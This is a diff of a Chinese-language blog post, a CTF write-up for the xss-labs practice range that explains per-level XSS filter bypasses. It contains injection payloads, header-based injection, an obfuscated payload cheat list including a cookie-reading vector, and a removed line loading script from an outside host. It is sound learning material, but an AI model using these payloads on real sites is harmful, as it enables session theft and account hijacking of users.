@@ -1,14 +1,12 @@
 ---
-title: Markdown Extended Features
+title: xss-labs wp
 published: 2025-11-09
 updated: 2025-11-23
-description: '关于xss-labs的wp'
-image: ''
+description: '关于xss漏洞的绕过手法'
 tags: [CTF, web, labs]
-category: 'ctf'
-draft: false 
+category: 'CTF'
+draft: false
 ---
-
 # xss-labs wp
 
 开启方式：我是在github下了源码，然后用phpstudy打开使用的，此处存疑，到时候问问有没有别的方法
@@ -38,7 +36,7 @@ confirm("完成的不错！");
 
 ==这个靶场的运行逻辑在源代码中也可以找到，alrt()函数被重新定义了，只要调用了alrt()函数，就能触发进入下一关==
 
-![image-20251109123432077](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20251109123432077.png)
+![image-20251109123432077](./assets/image-20251109123432077.png)
 
 不难发现注入点，于是可以构造payload：
 
@@ -110,7 +108,7 @@ confirm("完成的不错！");
 
 这题中value被单引号包裹，尝试上一题的方法不成功，查看源码
 
-![image-20251109130330407](D:\下载\Typora\note\assets\image-20251109130330407.png)
+![image-20251109130330407](D:\blog\mizuki\src\content\posts\assets\image-20251109130330407-1763911745318-2.png)
 
 发现<>被过滤了,过滤方法是htmlspecialchars()函数，一下是关于它的介绍
 
@@ -132,7 +130,7 @@ confirm("完成的不错！");
 ' onclick='alert(1)
 ```
 
-![image-20251109132152094](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20251109132152094.png)
+![image-20251109132152094](D:\blog\mizuki\src\content\posts\assets\image-20251109132152094-1763911745318-1.png)
 
 可以看到我们添加了一个事件，但鼠标点击<input >时触发alert()函数，这样就没有用到<>了
 
@@ -220,11 +218,11 @@ confirm("完成的不错！");
 1"> <a href=javascript:alert()>
 ```
 
-![image-20251109173241878](D:\下载\Typora\note\aurora\assets\image-20251109173241878.png)
+![image-20251109173241878](D:\blog\mizuki\src\content\posts\assets\image-20251109173241878-1763911767818-6.png)
 
 注意到，如此构造后会形成一个新标签<a >内容是生成一个href属性，点击时跳转执行alert()函数，后面的`">`是这个按钮的外表
 
-![image-20251109173458953](D:\下载\Typora\note\aurora\assets\image-20251109173458953.png)
+![image-20251109173458953](D:\blog\mizuki\src\content\posts\assets\image-20251109173458953-1763911767818-5.png)
 
 就像这样，点击即可
 
@@ -315,7 +313,7 @@ confirm("完成的不错！");
 > 前面的写法称为实体名称，后面的写法则是实体编号。[ISO-8859-1字符集](https://www.qqxiuzi.cn/wz/zixun/1681.htm)（西欧语言）中两百多个字符设定了实体名称，而对于其它所有字符都可以用实体编号来代替。
 > ２、网页编码采用了特定语言的编码，却需要显示来自其它语言的字符。例如，网页编码采用了西欧语言ISO-8859-1，却要在网页中显示中文，这时必须将中文字符以实体形式写入HTML代码中。
 
-![image-20251110140114175](D:\下载\Typora\note\aurora\assets\image-20251110140114175.png)
+![image-20251110140114175](D:\blog\mizuki\src\content\posts\assets\image-20251110140114175-1763911815321-9.png)
 
 payload:
 
@@ -465,7 +463,7 @@ confirm("完成的不错！");
 
 但是存在`t_ref`输入，发现它的内容是一个网址，猜测是reference请求头
 
-![image-20251110193453904](D:\下载\Typora\note\aurora\assets\image-20251110193453904-1762774494740-1.png)
+![image-20251110193453904](D:\blog\mizuki\src\content\posts\assets\image-20251110193453904-1762774494740-1-1763911850330-11.png)
 
 用hackbar发送一个网址，发现`t_ref`的值改变了，改变为我的输入值，发现xss漏洞
 
@@ -475,7 +473,7 @@ payload to Referen:
 " onclick="alert(1)
 ```
 
-![image-20251110193719479](D:\下载\Typora\note\aurora\assets\image-20251110193719479.png)
+![image-20251110193719479](./assets/image-20251110193719479.png)
 
 ## level 12(User-agent注入
 
@@ -596,7 +594,7 @@ confirm("完成的不错！");
 ?src='level1.php'
 ```
 
-![image-20251111205735826](D:\下载\Typora\note\aurora\assets\image-20251111205735826.png)
+![image-20251111205735826](D:\blog\mizuki\src\content\posts\assets\image-20251111205735826-1763911874675-13.png)
 
 就会在这个页面添加`level 1.php`的内容，我们可以利用这个特性，借助别的level的payload来通关这道题
 
@@ -733,19 +731,19 @@ confirm("完成的不错！");
 ## 基础payload
 
 ```html
-<--`<img/src=` onerror=confirm``> --!>
 <Details Open OnToggle =co\u006efirm`XSS`>
-<SCRIPT SRC=http://damit5.kiwi/xss.js></SCRIPT>
+<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
+<Details Open OnToggle =co\u006efirm`XSS`>
 <SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
 <a href=1 onmouseover=alert(1)>nmask</a>
 <a href="javascript:confirm('xxx')" target="_blank" rel="nofollow">你可以点击我触发</a>
-<body onhashchange=a=alert,a(document.domain)>  <!-- # http://xxx.xxx.xxx#123 http://xxx.xxx.xxx#124 触发 -->
+<body onhashchange=a=alert,a(document.domain)>  
+<!-- # http://xxx.xxx.xxx#123 http://xxx.xxx.xxx#124 触发 -->
 <body/onpageshow=alert(1)>
 <body onpageshow=alert(1)>
 <details/open/ontoggle=top["al"+"ert"](1)>
 <discard onbegin=[1].find(alert)>
 <iframe src=javascript:alert(1)>
-<img src/*sv=x */onerror=alert()>
 <img src onerror=alt=''+document.domain>
 <img src="X" onerror=(a=alert,b=document['\x63\x6f\x6f\x6b\x69\x65'],a(b))>
 <img src="X" onerror=top[8680439..toString(30)](1337)>
